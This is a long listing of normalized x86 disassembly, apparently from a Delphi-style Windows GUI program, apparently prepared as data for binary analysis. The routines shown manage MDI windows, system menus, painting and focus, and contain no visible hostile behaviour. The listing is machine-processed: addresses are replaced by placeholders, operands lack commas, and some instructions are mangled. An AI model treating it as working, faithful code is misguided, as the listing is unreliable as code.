mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_45a4c8
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45df3c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45df28
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_45a4c8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45df28
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45df3c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45df28
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc2c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc10
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dbf8
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45df28
call sub_45dbf8
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dbf8
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc44
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc2c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc10
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dbf8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc44
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc2c
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45df28
call sub_45dc2c
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc2c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc10
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dbf8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc44
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dbf8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc44
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc2c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45df28
call sub_45dc10
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_45ae04
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4583b8
mov edx esi
mov eax edi
call sub_45d7a8
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_45aeb3 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_443eb0
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_443eb0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_45b015
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4583c8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov eax ebx
call sub_45b974
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_4402a8
push eax
mov eax ebx
call sub_4402ec
push eax
mov eax ebx
call sub_4470c4
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406d18
mov [ ebx + 0x254 ] eax
push ebx
push sub_459f60
call sub_420bcc
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_450c58
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_4470c4
push eax
call SetWindowPos
jmp r-xdata
sub_45b162
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45b28d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_444214
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45d680
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b294
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_45b29c
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_444480
push 0x0
mov eax ebx
call sub_4470c4
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_45b2e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_444c04
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_4470c4
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4470c4
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45b344
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45b3ec
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b3f3
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
mov eax edi
call sub_4576d8
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403418
mov eax ebx
call sub_45b6fc
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403418
test al al
jne r-xdata
sub_45b3fc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_443b68
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_443b68
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_45b344
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_45b444
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_45b344
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_45b468
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_41a2e0
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_41a218
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_41a2e0
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_41a218
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_45b6d8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_4470c4
mov dx 0xb000
call sub_4574a0
test al al
jne r-xdata
call sub_4470c4
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_4574a0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b6df
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403a54
jmp r-xdata
call sub_403a54
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_443b68
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_4470c4
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_4574a0
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_441a58
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
call sub_403a54
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_4470c4
mov dx 0xb01a
call sub_4574a0
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403a54
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_441a58
sub_45b6fc
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_441a58
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_4470c4
push eax
call SetFocus
mov eax ebx
call sub_4470c4
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_45b74c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_441a58
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45b800
mov eax esi
call sub_45b6fc
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_4474ec
mov edx eax
mov eax esi
call sub_45b344
sub_45b7b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45a3c8
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_441a58
mov eax ebx
call sub_45a3c8
mov edx esi
call sub_45b7b0
sub_45b800
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_454784
mov edx esi
call sub_454768
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45b8a8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_45b8f4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_45b8a8
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45b924
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_45b8a8
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_45b990
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_423ad8
xor eax eax
push ebp
push sub_45ba3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_423e4c
xor eax eax
push ebp
push sub_45ba1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403418
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ba22
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_423e4c
retn
sub_45ba4c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_45a3c8
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_45a3fc
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403418
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_446354
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_45a448
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403418
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_45baec
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4470c4
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_4470c4
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_45b974
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_4470c4
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44521c
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45bb6a
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_4236b8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_45bbcc
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4470c4
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_4454e0
pop edi
pop esi
retn
sub_45bc18
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4470c4
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_45bd14
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_45a73c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_45bc18
pop ecx
sub_45bd48
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_441f74
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4470c4
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4470c4
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4470c4
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_440f4c
pop esi
pop ebx
retn
sub_45bdd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_4462e0
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_4470c4
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_4541a4
sub_45be38
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_44537c
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
